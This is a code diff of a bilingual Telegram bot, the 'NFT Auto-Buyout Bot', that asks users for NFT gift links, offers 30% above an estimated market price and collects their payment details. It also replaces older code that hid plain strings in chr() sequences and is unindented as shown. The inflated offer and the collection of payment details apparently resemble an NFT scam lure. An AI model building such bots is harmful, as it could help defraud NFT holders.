+            parse_mode="Markdown", reply_markup=admin_keyboard()
+        )
+        return
+
+    if data == "admin_broadcast":
+        await query.edit_message_text(
+            "📢 Рассылка\n\nФункция рассылки: подключите базу данных и реализуйте хранение user_id для отправки.",
+            reply_markup=admin_keyboard()
+        )
+        return
+
+    if data == "admin_banner":
+        await query.edit_message_text(
+            "🖼 *Изменение баннера*\n\nОтправьте новое фото с подписью для баннера. "
+            "(Функция требует реализации хранилища)",
+            parse_mode="Markdown", reply_markup=admin_keyboard()
+        )
+        return
+
+    if data == "admin_deals":
+        await query.edit_message_text(
+            "💬 *Все сделки*\n\nПодключите базу данных для просмотра истории сделок.",
+            parse_mode="Markdown", reply_markup=admin_keyboard()
+        )
+        return
+
+    if data == "admin_ban":
+        await query.edit_message_text(
+            "🚫 *Блокировка юзера*\n\nВведите команду `/ban USER_ID` для блокировки.",
+            parse_mode="Markdown", reply_markup=admin_keyboard()
+        )
+        return
+
+async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    state = context.user_data.get("state")
+    lang = get_lang(context)
+    text = update.message.text.strip()
+
+    # ===== NFT link waiting =====
+    if state == WAITING_NFT_LINK:
+        if not is_nft_link(text):
+            err = (
+                "⚠️ *Ошибка!* Это не похоже на ссылку NFT-подарка.\n\n"
+                "Пожалуйста, отправьте корректную ссылку в формате:\n"
+                "`https://t.me/nft/НазваниеНФТ-Номер`"
+                if lang == "ru" else
+                "⚠️ *Error!* This doesn't look like an NFT gift link.\n\n"
+                "Please send a valid link in the format:\n"
+                "`https://t.me/nft/NFTName-Number`"
+            )
+            await update.message.reply_text(err, parse_mode="Markdown")
+            return
+
+        context.user_data["nft_link"] = text
+        nft_name = text.split("/nft/")[-1].split("-")[0]
+        base_price, our_price = estimate_price(nft_name)
+        context.user_data["base_price"] = base_price
+        context.user_data["our_price"] = our_price
+        context.user_data["state"] = WAITING_PAYMENT_METHOD
+
+        msg = (
+            f"🔍 *Анализ NFT завершён!*\n\n"
+            f"📎 NFT: `{text}`\n"
+            f"🏷 Рыночная стоимость: ~${base_price} USDT\n"
+            f"💰 *Наше предложение: ${our_price} USDT (+30%)*\n\n"
+            f"Выберите способ получения оплаты 👇"
+            if lang == "ru" else
+            f"🔍 *NFT Analysis complete!*\n\n"
+            f"📎 NFT: `{text}`\n"
+            f"🏷 Market value: ~${base_price} USDT\n"
+            f"💰 *Our offer: ${our_price} USDT (+30%)*\n\n"
+            f"Choose your payment method 👇"
+        )
+        await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=payment_keyboard(lang))
+        return
+
+    # ===== Requisites waiting =====
+    if state == WAITING_REQUISITES:
+        context.user_data["requisites"] = text
+        nft_link = context.user_data.get("nft_link", "")
+        our_price = context.user_data.get("our_price", 0)
+        payment = context.user_data.get("payment", "")
+        context.user_data["state"] = None
+
+        msg = (
+            f"✅ *Реквизиты приняты!*\n\n"
+            f"📋 *Итог сделки:*\n"
+            f"📎 NFT: `{nft_link}`\n"
+            f"💳 Способ оплаты: {payment}\n"
+            f"💵 Сумма: *${our_price} USDT*\n"
+            f"📝 Реквизиты: `{text}`\n\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n"
+            f"💬 *Я предлагаю вам за ваш NFT* `{nft_link}` сумму *${our_price} USDT*\n\n"
+            f"Если согласны — нажмите *Да*, если нет — *Нет* 👇"
+            if lang == "ru" else
+            f"✅ *Details accepted!*\n\n"
+            f"📋 *Deal summary:*\n"
+            f"📎 NFT: `{nft_link}`\n"
+            f"💳 Payment method: {payment}\n"
+            f"💵 Amount: *${our_price} USDT*\n"
+            f"📝 Details: `{text}`\n\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n"
+            f"💬 *I offer you for your NFT* `{nft_link}` the sum of *${our_price} USDT*\n\n"
+            f"If you agree — press *Yes*, if not — *No* 👇"
+        )
+        await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=confirm_keyboard(lang))
+        return
+
+async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID:
+        await update.message.reply_text("⛔ Доступ запрещён.")
+        return
+
+    banner_text = (
+        "🛡 *ADMIN PANEL*\n\n"
+        "━━━━━━━━━━━━━━━━━━━━\n"
+        "🤖 NFT Auto-Buyout Bot\n"
+        "📊 Управление ботом\n"
+        "━━━━━━━━━━━━━━━━━━━━\n\n"
+        "Выберите действие:"
+    )
+
+    # Try to send with image (banner)
+    banner_url = "https://i.imgur.com/NFT_placeholder.jpg"  # замените на свой баннер
+    try:
+        await update.message.reply_photo(
+            photo=banner_url,
+            caption=banner_text,
+            parse_mode="Markdown",
+            reply_markup=admin_keyboard()
+        )
+    except:
+        await update.message.reply_text(banner_text, parse_mode="Markdown", reply_markup=admin_keyboard())
 
 def main():
-app = Application.builder().token(TOKEN).build()
-conv = ConversationHandler(
-entry_points=[CommandHandler(chr(115)+chr(116)+chr(97)+chr(114)+chr(116), start)],
-states={
-LANG: [CallbackQueryHandler(lang_cb, pattern=chr(94)+chr(108)+chr(97)+chr(110)+chr(103)+chr(95))],
-MAIN_MENU: [CallbackQueryHandler(menu_cb)],
-SELL_NFT_LINK: [MessageHandler(filters.TEXT & ~filters.COMMAND, recv_link)],
-SELL_CURRENCY: [CallbackQueryHandler(cur_cb, pattern=chr(94)+chr(99)+chr(117)+chr(114)+chr(95))],
-SELL_CONFIRM: [CallbackQueryHandler(confirm_cb, pattern=chr(94)+chr(40)+chr(121)+chr(101)+chr(115)+chr(124)+chr(110)+chr(111)+chr(41)+chr(36))],
-SELL_REQUISITES: [MessageHandler(filters.TEXT & ~filters.COMMAND, recv_req)],
-},
-fallbacks=[CommandHandler(chr(115)+chr(116)+chr(97)+chr(114)+chr(116), start)],
-allow_reentry=True,
-)
-app.add_handler(conv)
-app.add_handler(CommandHandler(chr(97)+chr(100)+chr(109)+chr(105)+chr(110), admin_cmd))
-app.add_handler(CallbackQueryHandler(admin_cb, pattern=chr(94)+chr(97)+chr(100)+chr(109)+chr(95)))
-logger.info(chr(66)+chr(111)+chr(116)+chr(32)+chr(115)+chr(116)+chr(97)+chr(114)+chr(116)+chr(101)+chr(100)+chr(33))
-app.run_polling()
+    app = Application.builder().token(BOT_TOKEN).build()
 
-if **name** == chr(95)+chr(95)+chr(109)+chr(97)+chr(105)+chr(110)+chr(95)+chr(95):
-main()
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("admin", admin_command))
+    app.add_handler(CallbackQueryHandler(button_handler))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
+
+    print("🤖 Bot started...")
+    app.run_polling()
+
+if __name__ == "__main__":
+    main()
